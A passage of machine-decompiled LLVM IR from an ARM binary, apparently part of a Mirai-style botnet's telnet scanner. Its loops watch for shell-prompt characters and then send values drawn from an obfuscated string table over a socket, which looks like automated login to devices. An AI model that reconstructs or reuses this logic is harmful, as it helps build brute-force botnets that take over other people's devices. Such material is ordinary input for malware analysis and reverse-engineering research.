  br i1 %v7_f338, label %.thread100, label %dec_label_pc_f348

.thread100:                                       ; preds = %.thread99
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_f334, align 1
  %v0_f344.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f344.pr.pr, label %.thread103, label %.thread100.dec_label_pc_f348thread-pre-split_crit_edge

.thread100.dec_label_pc_f348thread-pre-split_crit_edge: ; preds = %.thread100
  %v0_f348.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f348

dec_label_pc_f348:                                ; preds = %.thread99, %.thread100.dec_label_pc_f348thread-pre-split_crit_edge
  %v0_f348.pr = phi i32 [ %v0_f348.pr.pre, %.thread100.dec_label_pc_f348thread-pre-split_crit_edge ], [ %v4_f334, %.thread99 ]
  %v2_f348 = icmp ugt i32 %v0_f348.pr, 250
  store i1 %v2_f348, i1* %cpsr_c.global-to-local, align 1
  %v7_f348 = icmp eq i32 %v0_f348.pr, 251
  store i1 %v7_f348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f348, label %bb434, label %.thread103

bb434:                                            ; preds = %dec_label_pc_f348
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f350 = load i32, i32* @r4, align 4
  %v4_f350 = add i32 %v3_f350, 2
  %v5_f350 = inttoptr i32 %v4_f350 to i8*
  store i8 -3, i8* %v5_f350, align 1
  br label %.thread103

.thread103:                                       ; preds = %dec_label_pc_f348, %.thread100, %bb434
  %v0_f354 = load i32, i32* @r6, align 4
  %v1_f354 = add i32 %v0_f354, 4
  %v2_f354 = inttoptr i32 %v1_f354 to i32*
  %v3_f354 = load i32, i32* %v2_f354, align 4
  store i32 %v3_f354, i32* %r0.global-to-local, align 4
  %v0_f358 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f360

dec_label_pc_f360:                                ; preds = %dec_label_pc_fa0c, %.thread103
  %v0_f364 = phi i32 [ %v3_fa20, %dec_label_pc_fa0c ], [ %v3_f354, %.thread103 ]
  %storemerge4 = phi i32 [ %v2_f8ac, %dec_label_pc_fa0c ], [ %v0_f358, %.thread103 ]
  %storemerge3 = phi i32 [ 9, %dec_label_pc_fa0c ], [ 3, %.thread103 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f364 = call i32 @__libc_send(i32 %v0_f364, i32 %storemerge4, i32 %storemerge3, i32 16384)
  store i32 %v4_f364, i32* %r0.global-to-local, align 4
  %v0_f368 = load i32, i32* @r6, align 4
  %v1_f368 = add i32 %v0_f368, 24
  %v2_f368 = inttoptr i32 %v1_f368 to i32*
  %v3_f368 = load i32, i32* %v2_f368, align 4
  store i32 %v3_f368, i32* %r1.global-to-local, align 4
  %v0_f36c = load i32, i32* @r7, align 4
  %v1_f36c = add i32 %v0_f36c, 3
  store i32 %v1_f36c, i32* @r7, align 4
  %v3_f370 = icmp uge i32 %v1_f36c, %v3_f368
  store i1 %v3_f370, i1* %cpsr_c.global-to-local, align 1
  %v9_f370 = icmp eq i32 %v1_f36c, %v3_f368
  store i1 %v9_f370, i1* %cpsr_z.global-to-local, align 1
  %v0_f374 = load i32, i32* @r4, align 4
  %v1_f374 = add i32 %v0_f374, 3
  store i32 %v1_f374, i32* @r4, align 4
  %v5_f378 = icmp slt i32 %v1_f36c, %v3_f368
  br i1 %v5_f378, label %dec_label_pc_f2d0, label %dec_label_pc_f37c

dec_label_pc_f37c:                                ; preds = %dec_label_pc_f2c8.loopexit, %dec_label_pc_f2d0, %dec_label_pc_f360, %dec_label_pc_f308, %dec_label_pc_f2dc, %dec_label_pc_f2bc, %dec_label_pc_f894.dec_label_pc_f37c.loopexit_crit_edge
  %v6_f384 = phi i32 [ %v0_f8c4, %dec_label_pc_f894.dec_label_pc_f37c.loopexit_crit_edge ], [ %v0_efd0, %dec_label_pc_f2bc ], [ %v6_f384274, %dec_label_pc_f2d0 ], [ %v0_f368, %dec_label_pc_f360 ], [ %v6_f384274, %dec_label_pc_f308 ], [ %v6_f384274, %dec_label_pc_f2dc ], [ %v6_f384274, %dec_label_pc_f2c8.loopexit ]
  %v0_f37c = phi i32 [ %v0_f37c.pre.pre, %dec_label_pc_f894.dec_label_pc_f37c.loopexit_crit_edge ], [ 0, %dec_label_pc_f2bc ], [ %v1_f2f8, %dec_label_pc_f2d0 ], [ %v1_f36c, %dec_label_pc_f360 ], [ %v1_f2f8, %dec_label_pc_f308 ], [ %v1_f2f8, %dec_label_pc_f2dc ], [ %v2_f2f8, %dec_label_pc_f2c8.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f37c = icmp eq i32 %v0_f37c, 0
  store i1 %v2_f37c, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp slt i32 %v0_f37c, 1
  br i1 %tmp435, label %dec_label_pc_f768, label %bb436

bb436:                                            ; preds = %dec_label_pc_f37c
  store i32 3, i32* @r3, align 4
  %v7_f384 = add i32 %v6_f384, 12
  %v8_f384 = inttoptr i32 %v7_f384 to i32*
  store i32 3, i32* %v8_f384, align 4
  br label %dec_label_pc_f768

dec_label_pc_f38c:                                ; preds = %dec_label_pc_efd0
  %v1_f38c = add i32 %v0_efd0, 24
  %v2_f38c = inttoptr i32 %v1_f38c to i32*
  %v3_f38c = load i32, i32* %v2_f38c, align 4
  store i32 %v3_f38c, i32* %r2.global-to-local, align 4
  %v1_f390 = add i32 %v3_f38c, -1
  store i32 %v1_f390, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f394 = icmp eq i32 %v1_f390, 0
  store i1 %v2_f394, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v1_f390, 1
  br i1 %tmp437, label %dec_label_pc_ef54.backedge.thread, label %dec_label_pc_f39c

dec_label_pc_f39c:                                ; preds = %dec_label_pc_f38c
  %v2_f39c = add i32 %v1_f390, %v0_efd0
  store i32 %v2_f39c, i32* %r3.global-to-local, align 4
  %v1_f3a0 = add i32 %v2_f39c, 28
  %v2_f3a0 = inttoptr i32 %v1_f3a0 to i8*
  %v3_f3a0 = load i8, i8* %v2_f3a0, align 1
  %v4_f3a0 = zext i8 %v3_f3a0 to i32
  store i32 %v4_f3a0, i32* %r3.global-to-local, align 4
  %v2_f3a4 = icmp ugt i8 %v3_f3a0, 61
  store i1 %v2_f3a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3a4 = icmp eq i8 %v3_f3a0, 62
  store i1 %v7_f3a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3a4, label %dec_label_pc_f408, label %bb438

bb438:                                            ; preds = %dec_label_pc_f39c
  %v3_f3a8 = icmp ugt i8 %v3_f3a0, 57
  store i1 %v3_f3a8, i1* %cpsr_c.global-to-local, align 1
  %v8_f3a8 = icmp eq i8 %v3_f3a0, 58
  store i1 %v8_f3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f3a8, label %dec_label_pc_f408, label %dec_label_pc_f3b0

dec_label_pc_f3b0:                                ; preds = %bb438
  %v2_f3b0 = icmp ugt i8 %v3_f3a0, 35
  store i1 %v2_f3b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3b0 = icmp eq i8 %v3_f3a0, 36
  store i1 %v7_f3b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3b0, label %dec_label_pc_f408, label %dec_label_pc_f3b8

dec_label_pc_f3b8:                                ; preds = %dec_label_pc_f3b0
  %v2_f3b8 = icmp ugt i8 %v3_f3a0, 34
  store i1 %v2_f3b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f3b8 = icmp eq i8 %v3_f3a0, 35
  store i1 %v7_f3b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3b8, label %dec_label_pc_f408, label %dec_label_pc_f3c0

dec_label_pc_f3c0:                                ; preds = %dec_label_pc_f3b8
  %v2_f3c0 = icmp ugt i8 %v3_f3a0, 36
  store i1 %v2_f3c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3c0 = icmp eq i8 %v3_f3a0, 37
  store i1 %v7_f3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3c0, label %dec_label_pc_f408, label %dec_label_pc_f3f0.preheader

dec_label_pc_f3f0.preheader:                      ; preds = %dec_label_pc_f3c0
  %v3_f3c4 = add i32 %v0_efd0, 28
  %v2_f3c8 = add i32 %v3_f3c4, %v3_f38c
  store i32 %v2_f3c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f3f0

dec_label_pc_f3d4:                                ; preds = %bb439
  %v2_f3d4 = icmp ugt i8 %v3_f3f8, 35
  store i1 %v2_f3d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3d4 = icmp eq i8 %v3_f3f8, 36
  store i1 %v7_f3d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3d4, label %dec_label_pc_f408, label %dec_label_pc_f3dc

dec_label_pc_f3dc:                                ; preds = %dec_label_pc_f3d4
  %v2_f3dc = icmp ugt i8 %v3_f3f8, 34
  store i1 %v2_f3dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f3dc = icmp eq i8 %v3_f3f8, 35
  store i1 %v7_f3dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3dc, label %dec_label_pc_f408, label %dec_label_pc_f3e4

dec_label_pc_f3e4:                                ; preds = %dec_label_pc_f3dc
  %v2_f3e4 = icmp ugt i8 %v3_f3f8, 36
  store i1 %v2_f3e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3e4 = icmp eq i8 %v3_f3f8, 37
  store i1 %v7_f3e4, i1* %cpsr_z.global-to-local, align 1
  %v1_f3e8 = add i32 %v0_f3e8, -1
  store i32 %v1_f3e8, i32* %r3.global-to-local, align 4
  br i1 %v7_f3e4, label %dec_label_pc_f408, label %dec_label_pc_f3f0

dec_label_pc_f3f0:                                ; preds = %dec_label_pc_f3f0.preheader, %dec_label_pc_f3e4
  %v0_f3e8 = phi i32 [ %v2_f3c8, %dec_label_pc_f3f0.preheader ], [ %v1_f3e8, %dec_label_pc_f3e4 ]
  %v0_f3f0 = phi i32 [ %v1_f390, %dec_label_pc_f3f0.preheader ], [ %v1_f3f0, %dec_label_pc_f3e4 ]
  %v1_f3f0 = add i32 %v0_f3f0, -1
  store i32 %v1_f3f0, i32* %r1.global-to-local, align 4
  %v2_f3f0 = icmp ne i32 %v0_f3f0, 0
  store i1 %v2_f3f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3f0 = icmp eq i32 %v0_f3f0, 1
  store i1 %v7_f3f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3f0, label %dec_label_pc_ef54.backedge.thread561, label %dec_label_pc_f3f8

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f3f0
  %v1_f3f8 = add i32 %v0_f3e8, -2
  %v2_f3f8 = inttoptr i32 %v1_f3f8 to i8*
  %v3_f3f8 = load i8, i8* %v2_f3f8, align 1
  %v4_f3f8 = zext i8 %v3_f3f8 to i32
  store i32 %v4_f3f8, i32* %r2.global-to-local, align 4
  %v2_f3fc = icmp ugt i8 %v3_f3f8, 61
  store i1 %v2_f3fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f3fc = icmp eq i8 %v3_f3f8, 62
  store i1 %v7_f3fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3fc, label %dec_label_pc_f408, label %bb439

bb439:                                            ; preds = %dec_label_pc_f3f8
  %v3_f400 = icmp ugt i8 %v3_f3f8, 57
  store i1 %v3_f400, i1* %cpsr_c.global-to-local, align 1
  %v8_f400 = icmp eq i8 %v3_f3f8, 58
  store i1 %v8_f400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f400, label %dec_label_pc_f408, label %dec_label_pc_f3d4

dec_label_pc_f408:                                ; preds = %dec_label_pc_f3f8, %bb439, %dec_label_pc_f3e4, %dec_label_pc_f3dc, %dec_label_pc_f3d4, %dec_label_pc_f3c0, %dec_label_pc_f39c, %dec_label_pc_f3b8, %dec_label_pc_f3b0, %bb438
  %v0_f40c = phi i32 [ %v1_f390, %dec_label_pc_f3c0 ], [ %v1_f390, %dec_label_pc_f39c ], [ %v1_f390, %dec_label_pc_f3b8 ], [ %v1_f390, %dec_label_pc_f3b0 ], [ %v1_f390, %bb438 ], [ %v1_f3f0, %dec_label_pc_f3d4 ], [ %v1_f3f0, %dec_label_pc_f3dc ], [ %v1_f3f0, %dec_label_pc_f3e4 ], [ %v1_f3f0, %bb439 ], [ %v1_f3f0, %dec_label_pc_f3f8 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f40c = add i32 %v0_f40c, 1
  store i32 %v1_f40c, i32* @r7, align 4
  %v1_f410 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_f804, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_f420 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_f420, i32* %r0.global-to-local, align 4
  %v3_f424 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f424, i32* %r2.global-to-local, align 4
  store i32 %v3_f420, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f430 = load i32, i32* @r6, align 4
  %v1_f430 = add i32 %v0_f430, 4
  %v2_f430 = inttoptr i32 %v1_f430 to i32*
  %v3_f430 = load i32, i32* %v2_f430, align 4
  store i32 %v3_f430, i32* %r0.global-to-local, align 4
  %v4_f434 = call i32 @__libc_send(i32 %v3_f430, i32 %v3_f420, i32 %v3_f424, i32 16384)
  store i32 %v4_f434, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f444 = load i32, i32* @r6, align 4
  %v1_f444 = add i32 %v0_f444, 4
  %v2_f444 = inttoptr i32 %v1_f444 to i32*
  %v3_f444 = load i32, i32* %v2_f444, align 4
  store i32 %v3_f444, i32* %r0.global-to-local, align 4
  %v4_f448 = call i32 @__libc_send(i32 %v3_f444, i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f450 = call i32 @table_lock_val(i32 6)
  store i32 %v1_f450, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_f458 = load i32, i32* @r6, align 4
  %v2_f458 = add i32 %v1_f458, 12
  %v3_f458 = inttoptr i32 %v2_f458 to i32*
  store i32 7, i32* %v3_f458, align 4
  br label %dec_label_pc_f0ec

dec_label_pc_f460:                                ; preds = %dec_label_pc_efd0
  %v1_f460 = add i32 %v0_efd0, 24
  %v2_f460 = inttoptr i32 %v1_f460 to i32*
  %v3_f460 = load i32, i32* %v2_f460, align 4
  store i32 %v3_f460, i32* %r2.global-to-local, align 4
  %v1_f464 = add i32 %v3_f460, -1
  store i32 %v1_f464, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f468 = icmp eq i32 %v1_f464, 0
  store i1 %v2_f468, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_f464, 1
  br i1 %tmp440, label %dec_label_pc_ef54.backedge.thread, label %dec_label_pc_f470

dec_label_pc_f470:                                ; preds = %dec_label_pc_f460
  %v2_f470 = add i32 %v1_f464, %v0_efd0
  store i32 %v2_f470, i32* %r3.global-to-local, align 4
  %v1_f474 = add i32 %v2_f470, 28
  %v2_f474 = inttoptr i32 %v1_f474 to i8*
  %v3_f474 = load i8, i8* %v2_f474, align 1
  %v4_f474 = zext i8 %v3_f474 to i32
  store i32 %v4_f474, i32* %r3.global-to-local, align 4
  %v2_f478 = icmp ugt i8 %v3_f474, 61
  store i1 %v2_f478, i1* %cpsr_c.global-to-local, align 1
  %v7_f478 = icmp eq i8 %v3_f474, 62
  store i1 %v7_f478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f478, label %dec_label_pc_f4dc, label %bb441

bb441:                                            ; preds = %dec_label_pc_f470
  %v3_f47c = icmp ugt i8 %v3_f474, 57
  store i1 %v3_f47c, i1* %cpsr_c.global-to-local, align 1
  %v8_f47c = icmp eq i8 %v3_f474, 58
  store i1 %v8_f47c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f47c, label %dec_label_pc_f4dc, label %dec_label_pc_f484

dec_label_pc_f484:                                ; preds = %bb441
  %v2_f484 = icmp ugt i8 %v3_f474, 35
  store i1 %v2_f484, i1* %cpsr_c.global-to-local, align 1
  %v7_f484 = icmp eq i8 %v3_f474, 36
  store i1 %v7_f484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f484, label %dec_label_pc_f4dc, label %dec_label_pc_f48c

dec_label_pc_f48c:                                ; preds = %dec_label_pc_f484
  %v2_f48c = icmp ugt i8 %v3_f474, 34
  store i1 %v2_f48c, i1* %cpsr_c.global-to-local, align 1
  %v7_f48c = icmp eq i8 %v3_f474, 35
  store i1 %v7_f48c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f48c, label %dec_label_pc_f4dc, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f48c
  %v2_f494 = icmp ugt i8 %v3_f474, 36
  store i1 %v2_f494, i1* %cpsr_c.global-to-local, align 1
  %v7_f494 = icmp eq i8 %v3_f474, 37
  store i1 %v7_f494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f494, label %dec_label_pc_f4dc, label %dec_label_pc_f4c4.preheader

dec_label_pc_f4c4.preheader:                      ; preds = %dec_label_pc_f494
  %v3_f498 = add i32 %v0_efd0, 28
  %v2_f49c = add i32 %v3_f498, %v3_f460
  store i32 %v2_f49c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f4c4

dec_label_pc_f4a8:                                ; preds = %bb442
  %v2_f4a8 = icmp ugt i8 %v3_f4cc, 35
  store i1 %v2_f4a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4a8 = icmp eq i8 %v3_f4cc, 36
  store i1 %v7_f4a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4a8, label %dec_label_pc_f4dc, label %dec_label_pc_f4b0

dec_label_pc_f4b0:                                ; preds = %dec_label_pc_f4a8
  %v2_f4b0 = icmp ugt i8 %v3_f4cc, 34
  store i1 %v2_f4b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4b0 = icmp eq i8 %v3_f4cc, 35
  store i1 %v7_f4b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4b0, label %dec_label_pc_f4dc, label %dec_label_pc_f4b8

dec_label_pc_f4b8:                                ; preds = %dec_label_pc_f4b0
  %v2_f4b8 = icmp ugt i8 %v3_f4cc, 36
  store i1 %v2_f4b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4b8 = icmp eq i8 %v3_f4cc, 37
  store i1 %v7_f4b8, i1* %cpsr_z.global-to-local, align 1
  %v1_f4bc = add i32 %v0_f4bc, -1
  store i32 %v1_f4bc, i32* %r3.global-to-local, align 4
  br i1 %v7_f4b8, label %dec_label_pc_f4dc, label %dec_label_pc_f4c4

dec_label_pc_f4c4:                                ; preds = %dec_label_pc_f4c4.preheader, %dec_label_pc_f4b8
  %v0_f4bc = phi i32 [ %v2_f49c, %dec_label_pc_f4c4.preheader ], [ %v1_f4bc, %dec_label_pc_f4b8 ]
  %v0_f4c4 = phi i32 [ %v1_f464, %dec_label_pc_f4c4.preheader ], [ %v1_f4c4, %dec_label_pc_f4b8 ]
  %v1_f4c4 = add i32 %v0_f4c4, -1
  store i32 %v1_f4c4, i32* %r1.global-to-local, align 4
  %v2_f4c4 = icmp ne i32 %v0_f4c4, 0
  store i1 %v2_f4c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f4c4 = icmp eq i32 %v0_f4c4, 1
  store i1 %v7_f4c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4c4, label %dec_label_pc_ef54.backedge.thread561, label %dec_label_pc_f4cc

dec_label_pc_f4cc:                                ; preds = %dec_label_pc_f4c4
  %v1_f4cc = add i32 %v0_f4bc, -2
  %v2_f4cc = inttoptr i32 %v1_f4cc to i8*
  %v3_f4cc = load i8, i8* %v2_f4cc, align 1
  %v4_f4cc = zext i8 %v3_f4cc to i32
  store i32 %v4_f4cc, i32* %r2.global-to-local, align 4
  %v2_f4d0 = icmp ugt i8 %v3_f4cc, 61
  store i1 %v2_f4d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4d0 = icmp eq i8 %v3_f4cc, 62
  store i1 %v7_f4d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4d0, label %dec_label_pc_f4dc, label %bb442

bb442:                                            ; preds = %dec_label_pc_f4cc
  %v3_f4d4 = icmp ugt i8 %v3_f4cc, 57
  store i1 %v3_f4d4, i1* %cpsr_c.global-to-local, align 1
  %v8_f4d4 = icmp eq i8 %v3_f4cc, 58
  store i1 %v8_f4d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f4d4, label %dec_label_pc_f4dc, label %dec_label_pc_f4a8

dec_label_pc_f4dc:                                ; preds = %dec_label_pc_f4cc, %bb442, %dec_label_pc_f4b8, %dec_label_pc_f4b0, %dec_label_pc_f4a8, %dec_label_pc_f494, %dec_label_pc_f470, %dec_label_pc_f48c, %dec_label_pc_f484, %bb441
  %v0_f4e0 = phi i32 [ %v1_f464, %dec_label_pc_f494 ], [ %v1_f464, %dec_label_pc_f470 ], [ %v1_f464, %dec_label_pc_f48c ], [ %v1_f464, %dec_label_pc_f484 ], [ %v1_f464, %bb441 ], [ %v1_f4c4, %dec_label_pc_f4a8 ], [ %v1_f4c4, %dec_label_pc_f4b0 ], [ %v1_f4c4, %dec_label_pc_f4b8 ], [ %v1_f4c4, %bb442 ], [ %v1_f4c4, %dec_label_pc_f4cc ]
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_f4e0 = add i32 %v0_f4e0, 1
  store i32 %v1_f4e0, i32* @r7, align 4
  %v1_f4e4 = call i32 @table_unlock_val(i32 5)
  store i32 %v2_f804, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_f4f4 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-60)
  store i32 %v3_f4f4, i32* %r0.global-to-local, align 4
  %v3_f4f8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f4f8, i32* %r2.global-to-local, align 4
  store i32 %v3_f4f4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f504 = load i32, i32* @r6, align 4
  %v1_f504 = add i32 %v0_f504, 4
  %v2_f504 = inttoptr i32 %v1_f504 to i32*
  %v3_f504 = load i32, i32* %v2_f504, align 4
  store i32 %v3_f504, i32* %r0.global-to-local, align 4
  %v4_f508 = call i32 @__libc_send(i32 %v3_f504, i32 %v3_f4f4, i32 %v3_f4f8, i32 16384)
  store i32 %v4_f508, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f518 = load i32, i32* @r6, align 4
  %v1_f518 = add i32 %v0_f518, 4
  %v2_f518 = inttoptr i32 %v1_f518 to i32*
  %v3_f518 = load i32, i32* %v2_f518, align 4
  store i32 %v3_f518, i32* %r0.global-to-local, align 4
  %v4_f51c = call i32 @__libc_send(i32 %v3_f518, i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_f524 = call i32 @table_lock_val(i32 5)
  store i32 %v1_f524, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_f52c = load i32, i32* @r6, align 4
  %v2_f52c = add i32 %v1_f52c, 12
  %v3_f52c = inttoptr i32 %v2_f52c to i32*
  store i32 6, i32* %v3_f52c, align 4
  br label %dec_label_pc_f0ec

dec_label_pc_f5ac:                                ; preds = %dec_label_pc_efd0
  %v1_f5ac = add i32 %v0_efd0, 24
  %v2_f5ac = inttoptr i32 %v1_f5ac to i32*
  %v3_f5ac = load i32, i32* %v2_f5ac, align 4
  store i32 %v3_f5ac, i32* %r2.global-to-local, align 4
  %v1_f5b0 = add i32 %v3_f5ac, -1
  store i32 %v1_f5b0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5b4 = icmp eq i32 %v1_f5b0, 0
  store i1 %v2_f5b4, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_f5b0, 1
  br i1 %tmp443, label %dec_label_pc_ef54.backedge.thread, label %dec_label_pc_f5bc

dec_label_pc_f5bc:                                ; preds = %dec_label_pc_f5ac
  %v2_f5bc = add i32 %v1_f5b0, %v0_efd0
  store i32 %v2_f5bc, i32* %r3.global-to-local, align 4
  %v1_f5c0 = add i32 %v2_f5bc, 28
  %v2_f5c0 = inttoptr i32 %v1_f5c0 to i8*
  %v3_f5c0 = load i8, i8* %v2_f5c0, align 1
  %v4_f5c0 = zext i8 %v3_f5c0 to i32
  store i32 %v4_f5c0, i32* %r3.global-to-local, align 4
  %v2_f5c4 = icmp ugt i8 %v3_f5c0, 61
  store i1 %v2_f5c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5c4 = icmp eq i8 %v3_f5c0, 62
  store i1 %v7_f5c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5c4, label %dec_label_pc_f628, label %bb444

bb444:                                            ; preds = %dec_label_pc_f5bc
  %v3_f5c8 = icmp ugt i8 %v3_f5c0, 57
  store i1 %v3_f5c8, i1* %cpsr_c.global-to-local, align 1
  %v8_f5c8 = icmp eq i8 %v3_f5c0, 58
  store i1 %v8_f5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f5c8, label %dec_label_pc_f628, label %dec_label_pc_f5d0

dec_label_pc_f5d0:                                ; preds = %bb444
  %v2_f5d0 = icmp ugt i8 %v3_f5c0, 35
  store i1 %v2_f5d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5d0 = icmp eq i8 %v3_f5c0, 36
  store i1 %v7_f5d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5d0, label %dec_label_pc_f628, label %dec_label_pc_f5d8

dec_label_pc_f5d8:                                ; preds = %dec_label_pc_f5d0
  %v2_f5d8 = icmp ugt i8 %v3_f5c0, 34
  store i1 %v2_f5d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5d8 = icmp eq i8 %v3_f5c0, 35
  store i1 %v7_f5d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5d8, label %dec_label_pc_f628, label %dec_label_pc_f5e0

dec_label_pc_f5e0:                                ; preds = %dec_label_pc_f5d8
  %v2_f5e0 = icmp ugt i8 %v3_f5c0, 36
  store i1 %v2_f5e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5e0 = icmp eq i8 %v3_f5c0, 37
  store i1 %v7_f5e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5e0, label %dec_label_pc_f628, label %dec_label_pc_f610.preheader

dec_label_pc_f610.preheader:                      ; preds = %dec_label_pc_f5e0
  %v3_f5e4 = add i32 %v0_efd0, 28
  %v2_f5e8 = add i32 %v3_f5e4, %v3_f5ac
  store i32 %v2_f5e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f610

dec_label_pc_f5f4:                                ; preds = %bb445
  %v2_f5f4 = icmp ugt i8 %v3_f618, 35
  store i1 %v2_f5f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5f4 = icmp eq i8 %v3_f618, 36
  store i1 %v7_f5f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5f4, label %dec_label_pc_f628, label %dec_label_pc_f5fc

dec_label_pc_f5fc:                                ; preds = %dec_label_pc_f5f4
  %v2_f5fc = icmp ugt i8 %v3_f618, 34
  store i1 %v2_f5fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5fc = icmp eq i8 %v3_f618, 35
  store i1 %v7_f5fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5fc, label %dec_label_pc_f628, label %dec_label_pc_f604

dec_label_pc_f604:                                ; preds = %dec_label_pc_f5fc
  %v2_f604 = icmp ugt i8 %v3_f618, 36
  store i1 %v2_f604, i1* %cpsr_c.global-to-local, align 1
  %v7_f604 = icmp eq i8 %v3_f618, 37
  store i1 %v7_f604, i1* %cpsr_z.global-to-local, align 1
  %v1_f608 = add i32 %v0_f608, -1
  store i32 %v1_f608, i32* %r3.global-to-local, align 4
  br i1 %v7_f604, label %dec_label_pc_f628, label %dec_label_pc_f610

dec_label_pc_f610:                                ; preds = %dec_label_pc_f610.preheader, %dec_label_pc_f604
  %v0_f608 = phi i32 [ %v2_f5e8, %dec_label_pc_f610.preheader ], [ %v1_f608, %dec_label_pc_f604 ]
  %v0_f610 = phi i32 [ %v1_f5b0, %dec_label_pc_f610.preheader ], [ %v1_f610, %dec_label_pc_f604 ]
  %v1_f610 = add i32 %v0_f610, -1
  store i32 %v1_f610, i32* %r1.global-to-local, align 4
  %v2_f610 = icmp ne i32 %v0_f610, 0
  store i1 %v2_f610, i1* %cpsr_c.global-to-local, align 1
  %v7_f610 = icmp eq i32 %v0_f610, 1
  store i1 %v7_f610, i1* %cpsr_z.global-to-local, align 1
